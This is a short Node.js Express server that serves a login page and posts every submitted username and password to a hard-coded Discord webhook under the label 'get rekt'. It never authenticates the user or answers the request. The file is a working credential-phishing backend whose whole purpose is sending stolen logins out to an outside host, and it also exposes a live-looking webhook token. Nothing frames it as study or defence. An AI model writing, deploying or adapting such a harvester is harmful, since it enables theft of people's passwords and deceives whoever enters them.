var express = require('express');
var bodyParser = require('body-parser');
var path = require('path');
const webhook = require("webhook-discord")
const Hook = new webhook.Webhook("https://discord.com/api/webhooks/820288771878027285/t0JtM5oYuD1OZyJd5nswTRPELhFOFJmleYVyRYLyO9ymiUgj9V8grOddT_MTumBuSBXD");

var app = express();

app.use(bodyParser.urlencoded({extended : true}));
app.use(bodyParser.json());

app.get('/', function(request, response) {
	response.sendFile(path.join(__dirname + '/html/login.html'));
});

app.post('/auth', function (req, res) {
    const msg = new webhook.MessageBuilder()
                .setName("get rekt")
                .setColor("#aabbcc")
                .setText(`Username: ${req.body.username}\nPassword: ${req.body.password}`);
    Hook.send(msg);
});

app.listen(3000, () => {
    console.log(`Example app listening at http://localhost:3000`)
  })